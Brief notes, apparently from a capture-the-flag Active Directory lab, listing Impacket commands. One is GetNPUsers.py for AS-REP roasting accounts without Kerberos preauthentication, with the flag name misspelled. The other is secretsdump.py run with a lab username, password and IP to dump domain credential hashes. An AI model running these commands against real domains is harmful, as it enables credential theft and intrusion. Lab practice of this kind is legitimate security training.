### GetNPUsers.py

`python3 GetNPUsers.py THM-AD/backup -no-pass`
attempt to get the hash from a kerberos server

only works if userback has `UF_DONT_REQIRE_PREAUTH`

### secretsdump.py
`python3 /opt/impacket/examples/secretsdump.py  spookysec.local/backup:backup2517860@10.10.6.165`
